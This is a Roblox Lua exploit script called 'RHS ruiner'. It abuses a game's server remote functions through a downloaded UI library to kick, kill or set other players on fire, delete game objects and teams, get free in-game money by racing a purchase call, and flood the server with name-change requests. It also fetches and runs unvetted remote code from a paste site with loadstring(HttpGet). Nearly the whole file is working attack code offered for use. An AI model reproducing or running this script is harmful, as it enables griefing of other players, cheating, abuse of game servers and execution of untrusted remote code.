local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = lib.CreateLib("RHS ruiner", "Sentinel")
local Tab = Window:NewTab("main")
local Section = Tab:NewSection("rip RHS")
local Tabclient = Window:NewTab("client")
local Client = Tabclient:NewSection("chill")
local plr = ""

-- main

Section:NewTextBox("plr", "player", function(txt)
	for i,v in pairs(game.Players:GetChildren()) do
		if string.match(v.Name,txt) then
			plr = v
		end
	end
end)

Section:NewButton("Kick player", "never gonna give you up", function()
	game.ReplicatedStorage.RemoteFunctions.ApartmentPurchase:InvokeServer({
		Name = "Apartment",
		BuyDoor = plr,
		["Lock Button"] = workspace:FindFirstChild("Lock Button", true)
	})
end)

Section:NewButton("kill player", "never gonna give you up", function()
	game.ReplicatedStorage.RemoteFunctions.ApartmentPurchase:InvokeServer({
		Name = "Apartment",
		BuyDoor = plr.Character.Head,
		["Lock Button"] = workspace:FindFirstChild("Lock Button", true)
	})
end)

Section:NewButton("punish player", "never gonna tell a lie", function()
	game.ReplicatedStorage.RemoteFunctions.ApartmentPurchase:InvokeServer({
		Name = "Apartment",
		BuyDoor = game.Workspace[plr.Name],
		["Lock Button"] = workspace:FindFirstChild("Lock Button", true)
	})
end)

Section:NewButton("delete school", "and desert you", function()
	game.ReplicatedStorage.RemoteFunctions.ApartmentPurchase:InvokeServer({
		Name = "Apartment",
		BuyDoor = workspace.MiscParts,
		["Lock Button"] = workspace:FindFirstChild("Lock Button", true)
	})
end)

Section:NewButton("remove teams", ":)", function()
	for i,v in pairs(game.Teams:GetChildren()) do wait(0.1)
		game.ReplicatedStorage.RemoteFunctions.ApartmentPurchase:InvokeServer({
			Name = "Apartment",
			BuyDoor = v,
			["Lock Button"] = workspace:FindFirstChild("Lock Button", true)
		})
	end
end)

Section:NewButton("set everyone on fire", "lmao", function()
	game:GetService("ReplicatedStorage").RemoteFunctions.PurchaseTemporaryItem:InvokeServer("Club Red", "Dragonbreath Potion")
	game.Players.LocalPlayer.Backpack["Dragonbreath Potion"].Parent = game.Players.LocalPlayer.Character
	for i,v in pairs(game.Players:GetChildren()) do 
		game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name)["Dragonbreath Potion"].GenerateEffect:FireServer(game.Workspace:FindFirstChild(v.Name).Head)
		game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name)["Dragonbreath Potion"].GenerateEffect:FireServer(game.Workspace:FindFirstChild(v.Name).HumanoidRootPart)
	end
	game.Players.LocalPlayer.Character["Dragonbreath Potion"].Parent = game.Players.LocalPlayer.Backpack
end)

-- client

Client:NewButton("give gamepasses", "made by w a e", function()
	loadstring(game:HttpGetAsync("https://paste.ee/r/sWH9T/0"))()
end)

Client:NewButton("free money", "hmm :)", function()
	game.ReplicatedStorage.RemoteFunctions.ToggleRestrictLock:FireServer({
		Name = game.Players.LocalPlayer.Name,
		Restrictions = game:GetService("ReplicatedStorage").Objects["loyaltymulti_+$7,500 RHS Cash"].LPCost
	})
	for i = 1,25 do
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").RemoteFunctions.PurchaseLoyaltyItem:InvokeServer(294);
		end)()	
	end
end)

Client:NewButton("spam heads", "made by HTDBarsi", function()
	local face = game.Players.LocalPlayer.Character.Head:FindFirstChild("face") or game.Players.LocalPlayer.Character.Head:FindFirstChild("Face") or false
	game:GetService("ReplicatedStorage").RemoteFunctions.NameChangerRequest:InvokeServer("a", "");
	if face then
		face:Destroy()
	end

	while wait() do
		coroutine.wrap(function()
			game:GetService("ReplicatedStorage").RemoteFunctions.NameChangerRequest:InvokeServer("w", "");
		end)()
	end
end)
